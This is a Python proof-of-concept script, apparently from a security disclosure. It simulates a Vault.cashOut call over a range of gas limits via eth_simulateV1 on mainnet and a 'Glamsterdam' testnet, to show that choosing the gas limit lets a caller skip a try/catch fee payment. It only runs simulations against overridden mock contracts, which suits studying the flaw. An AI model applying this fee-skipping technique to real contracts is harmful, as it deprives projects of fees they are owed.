# PoC 1: today, a try/catch fee is paid at every gas limit where the transaction
# succeeds. On Glamsterdam, the caller can skip it by choosing the gas limit.
# Runs Vault.cashOut at every gas limit in a range, with eth_simulateV1 on
# Glamsterdam Sepolia and on Ethereum mainnet. Balances start non-zero,
# like Juicebox balances that already hold funds. No deploy and no key needed.
import json, subprocess
from concurrent.futures import ThreadPoolExecutor
RPC = {'mainnet': 'https://ethereum-rpc.publicnode.com', 'glamsterdam sepolia': 'https://ethereum-sepolia-rpc.publicnode.com'}
VAULT = '0x' + 'a' * 40
AT = lambda n: '0x' + '0' * 36 + n
USER = '0x000000000000000000000000000000000000B0B0'
code = lambda n: json.load(open(f'out/FeeSkip.sol/{n}.json'))['deployedBytecode']['object']
cast = lambda *a: subprocess.check_output(['cast', *a], text=True).strip()
FEE_PAID, FEE_FAILED = cast('keccak', 'FeePaid(uint256)'), cast('keccak', 'FeeFailed(uint256)')
DATA = cast('calldata', 'cashOut(uint256)', str(10**18))

ONE_V = '0x' + '0' * 63 + '1'
SLOT1 = '0x' + '0' * 63 + '1'
ONE = {'0x' + '0' * 64: ONE_V}  # balances that already hold funds start at 1

def rpc(url, method, params):
    for _ in range(5):
        try: return json.loads(subprocess.check_output(['curl', '-s', '-m', '60', '-H', 'content-type: application/json', '-d', json.dumps({'jsonrpc': '2.0', 'id': 1, 'method': method, 'params': params}), url]))
        except Exception: pass
    raise SystemExit(f'RPC failed: {url}')

def run(url, gas):
    r = rpc(url, 'eth_simulateV1', [{'blockStateCalls': [{
        'stateOverrides': {VAULT: {'code': code('Vault'), 'balance': hex(10**19), 'stateDiff': ONE}, AT('fee0'): {'code': code('FeeProject'), 'stateDiff': ONE}, AT('fee1'): {'code': code('Token'), 'stateDiff': {SLOT1: ONE_V}}, AT('fee2'): {'code': code('Hook')}, USER: {'balance': hex(10**19)}},
        'calls': [{'from': USER, 'to': VAULT, 'data': DATA, 'gas': hex(gas)}]}]}, 'latest'])['result'][0]['calls'][0]
    if int(r['status'], 16) == 0: return 'tx reverts'
    topics = [l['topics'][0] for l in r['logs']]
    return 'fee paid' if FEE_PAID in topics else 'FEE SKIPPED' if FEE_FAILED in topics else '?'

lo, hi, step = 30_000, 900_000, 2_000
for name, url in RPC.items():
    rows, prev = [], None
    gases = range(lo, hi, step)
    with ThreadPoolExecutor(8) as pool: outs = list(pool.map(lambda g: run(url, g), gases))
    for g, out in zip(gases, outs):
        if out != prev: rows.append([out, g, g]); prev = out
        else: rows[-1][2] = g
    print(f'\n{name}: Vault.cashOut at gas limits {lo:,} to {hi:,}')
    for out, a, b in rows: print(f'  {a:>9,} to {b:>9,}  {out}')
